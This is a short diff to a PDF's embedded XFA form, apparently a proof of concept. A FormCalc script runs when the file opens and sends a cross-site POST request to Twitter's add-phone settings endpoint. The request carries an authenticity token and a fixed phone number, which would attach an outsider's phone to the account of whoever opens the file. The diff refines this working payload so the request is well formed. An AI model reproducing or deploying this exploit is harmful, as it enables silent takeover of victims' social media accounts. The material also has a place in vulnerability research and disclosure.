@@ -18,7 +18,8 @@ stream
         <field id="Hello World!">
             <event activity="initialize">
                 <script contentType='application/x-formcalc'>
-                POST("https://twitter.com/settings/add_phone","device_type=phone&authenticity_token=9da1c27ce64ca4512daafdf9f6e38ce8a7b411aa&device%5Bcountry_code%5D=213&country_code=213&edit_phone=true&iso_code=DZ&phone_number=781077547")  
+                    var content = "device_type=phone&authenticity_token=9da1c27ce64ca4512daafdf9f6e38ce8a7b411aa&device[country_code]=213&country_code=213&edit_phone=true&iso_code=DZ&phone_number=781077547"
+                    POST("https://twitter.com/settings/add_phone",content,"application/x-www-form-urlencoded")
                 </script>
             </event>
         </field>
